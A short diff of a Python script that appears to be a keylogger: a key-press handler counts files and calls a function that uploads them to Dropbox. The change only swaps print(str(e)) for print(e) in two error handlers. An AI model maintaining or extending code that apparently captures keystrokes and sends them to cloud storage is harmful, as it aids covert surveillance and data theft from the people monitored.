@@ -58,7 +58,7 @@ def on_press(key):
                 upload_file()
                 file_num += 1
     except Exception as e:
-        print(str(e))
+        print(e)
 
 # upload the file to Dropbox
 def upload_file():
@@ -70,7 +70,7 @@ def upload_file():
     except AuthError as e:
         print('Authentication error')
     except Exception as e:
-        print(str(e))
+        print(e)
 
 # send the first file
 upload_file()
